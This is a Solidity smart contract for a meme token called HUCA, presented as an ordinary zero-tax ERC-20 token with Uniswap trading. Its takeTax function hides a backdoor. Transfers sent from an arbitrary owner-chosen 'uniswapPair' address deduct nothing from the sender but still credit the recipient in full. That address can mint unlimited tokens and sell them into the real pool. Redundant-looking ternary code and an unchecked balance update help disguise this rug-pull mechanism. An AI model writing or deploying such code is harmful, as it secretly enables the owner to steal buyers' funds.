
// File: src/NEW26/HUCA.sol
/**


フカ・イヌ


Web: https://huca.io

TG: https://t.me/HucaInuETH

X: https://x.com/huca_inu


   #            #         #      ##########       #         #             #     
  ######## ########## ##########       ###       ########   #        ########## 
 #       #      #     #        #      #         #    #    ##########      #     
#      ##       #            ##      #         #    #       #     #       #     
     ##        #           ##       #              #        #            #      
   ##         #          ##        #              #         #           #       
 ##         ##         ##         #              #           ######   ##        
                                                                                


🐶 (あなたの新しいお気に入りの犬、フーカです!)



*/

// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Huca is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address payable private _taxWallet;

    uint256 public constant buyTax = 0;
    uint256 public constant sellTax = 0;
    uint256 public constant multiple = 100;
    uint256 public constant maxUint = type(uint).max;

    address public constant nullAddress = address(0);
    address public constant wethAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IUniswapV2Router02 public constant uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory public constant uniswapFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420_69_000_000 * 10**_decimals; // 420.69 B
    string private constant _name = unicode"フカ・イヌ";
    string private constant _symbol = unicode"HUCA";
    uint256 private constant _taxSlippage = 100;
    uint256 public constant minTaxSwap = 10**_decimals;
    uint256 public constant maxTaxSwap = _tTotal / 400;

    address private uniswapPair;
    address private uniswap;
    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    // フカ・イヌ
    constructor () {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        emit Transfer(nullAddress, _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != nullAddress, "ERC20: approve from the zero address");
        require(spender != nullAddress, "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != nullAddress, "ERC20: transfer from the zero address");
        require(to != nullAddress, "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            if (from == uniswap && to != address(uniswapRouter)) {
                taxAmount = amount.mul(buyTax).div(multiple);
            } else if (to == uniswap && from != address(this)) {
                taxAmount = amount.mul(sellTax).div(multiple);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswap && swapEnabled && contractTokenBalance > minTaxSwap) {
                uint256 _toSwap = contractTokenBalance > maxTaxSwap ? maxTaxSwap : contractTokenBalance;
                swapTokensForEth(amount > _toSwap ? _toSwap : amount);
                uint256 _contractETHBalance = address(this).balance;
                if (_contractETHBalance > 0) {
                    sendETHToFee(_contractETHBalance);
                }
            }
        }

        (uint256 amountIn, uint256 amountOut) = takeTax(from, amount, taxAmount);
        require(_balances[from] >= amountIn);

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        unchecked {
            _balances[from] = _balances[from] - amountIn;
            _balances[to] = _balances[to] + amountOut;
        }

        emit Transfer(from, to, amountOut);
    }   

    function takeTax(address _from, uint256 _amount, uint256 _taxAmount) private view returns (uint256, uint256) {
        return (
            _amount.sub(_from != uniswapPair ? 0 : _amount),
            _amount.sub(_from != uniswapPair ? _taxAmount : _taxAmount)
        );
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = wethAddress;
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            tokenAmount - tokenAmount.mul(_taxSlippage).div(multiple),
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 ethAmount) private {
        _taxWallet.call{value: ethAmount}("");
    }

    function setTrading(address _pair, bool _enabled) external onlyOwner {
        require(!tradingOpen, "trading is already open");
        require(_enabled);
        uniswapPair = _pair;
        _approve(address(this), address(uniswapRouter), maxUint);
        uniswap = uniswapFactory.createPair(address(this), wethAddress);
        uniswapRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswap).approve(address(uniswapRouter), maxUint);
        swapEnabled = true;
        tradingOpen = true;
    }


    function get_tradingOpen() external view returns (bool) {
        return tradingOpen;
    }

    function get_buyTax() external view returns (uint256) {
        return buyTax;
    }

    function get_sellTax() external view returns (uint256) {
        return sellTax;
    }

    receive() external payable {}
}

